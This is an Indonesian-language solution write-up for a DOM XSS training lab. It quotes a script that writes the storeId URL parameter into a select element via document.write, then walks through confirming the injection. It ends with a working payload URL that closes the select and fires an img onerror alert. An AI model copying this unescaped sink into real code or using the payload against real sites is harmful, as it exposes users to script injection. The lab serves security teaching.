# DOM XSS in `document.write` sink using source `location.search` inside a select element

Lab ini berisi kerentanan **DOM-based cross-site scripting (XSS)** pada fitur **stock checker**. Lab ini menggunakan fungsi JavaScript **`document.write`**, yang menulis data ke halaman. Fungsi `document.write` dipanggil dengan data dari **`location.search`** yang dapat kamu kontrol melalui URL website. Data tersebut berada di dalam elemen **`select`**.

Untuk menyelesaikan lab ini, lakukan serangan cross-site scripting yang keluar dari elemen **`select`** dan memanggil fungsi **`alert`**.


## Solusi

1. Pada halaman produk, perhatikan bahwa JavaScript yang berbahaya mengambil parameter **`storeId`** dari sumber **`location.search`**. Kemudian menggunakan **`document.write`** untuk membuat option baru di dalam elemen **`select`** pada fitur pengecekan stok.

```html
<script>
    var stores = ["London", "Paris", "Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');

    if (store) {
        document.write('<option selected>' + store + '</option>');
    }

    for (var i = 0; i < stores.length; i++) {
        if (stores[i] === store) {
            continue;
        }

        document.write('<option>' + stores[i] + '</option>');
    }

    document.write('</select>');
</script>
```

2. Tambahkan parameter query **`storeId`** ke URL dan masukkan string alfanumerik acak sebagai nilainya. Akses URL yang sudah dimodifikasi tersebut.

3. Di browser, perhatikan bahwa string acak kamu sekarang muncul sebagai salah satu pilihan di daftar dropdown.

4. Klik kanan dan inspect dropdown tersebut untuk memastikan bahwa nilai dari parameter **`storeId`** telah dimasukkan ke dalam elemen **`select`**.

```html
<select name="storeId">
  <option selected="">TESTING123</option>
  <option>London</option>
  <option>Paris</option>
  <option>Milan</option>
  </select>
```


5. Ubah URL agar memasukkan payload XSS yang sesuai di dalam parameter **`storeId`** seperti berikut:

```text
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
